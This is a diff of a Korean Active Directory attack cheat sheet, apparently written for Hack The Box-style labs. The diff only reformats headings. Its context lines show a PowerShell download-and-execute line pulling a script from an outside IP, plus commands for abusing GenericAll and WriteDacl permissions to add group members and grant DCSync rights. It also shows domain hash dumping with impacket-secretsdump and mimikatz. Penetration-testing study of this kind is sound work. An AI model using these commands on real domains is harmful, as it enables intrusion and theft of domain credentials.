@@ -17,7 +17,7 @@ IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.8:8000/Pow
 
 ## GenericAll abuse
 
-#### Linux (Samba / rpc 모듈 사용)
+**Linux (Samba / rpc 모듈 사용)**
 
 목적: GenericAll 권한을 이용해 대상 그룹에 사용자 추가
 ```
@@ -36,7 +36,7 @@ net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "
 PoC
 ![2](/assets/images/cheatsheet/abuse_dacl/스크린샷%202025-10-04%20오후%203.41.26.png)
 
-#### Windows (PowerView)
+**Windows (PowerView)**
 
 Credential 생성
 ```
@@ -69,14 +69,14 @@ Get-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS'
 
 ## WriteDacl abuse
 
-#### Linux (impacket)
+**Linux (impacket)**
 
 impacket-dacledit 를 이용해 도메인 오브젝트의 DACL을 수정하여 DCSync 권한 부여
 ```
 impacket-dacledit -action 'write' -rights 'DCSync' -principal 'target_user' -target-dn 'DN' domain/'user':'pass'
 ```
 
-#### Windows (PowerView)
+**Windows (PowerView)**
 
 Credential 준비
 ```
@@ -103,11 +103,11 @@ Add-DomainObjectAcl 사용 시 -PrincipalIdentity로 유저를 지정해야 정�
 -TargetIdentity는 도메인명 문자열이 아닌 DN(DC=htb,DC=local) 형식으로 지정해야 정상 동작.
 
 ## DCSync
-#### Linux
+**Linux (impacket)**
 ```
 impacket-secretsdump domain/user:pass@target_ip
 ```
-#### Windows
+**Windows (mimikatz)**
 mimikatz.exe 사용
 ```
 mimikatz # privilege::debug
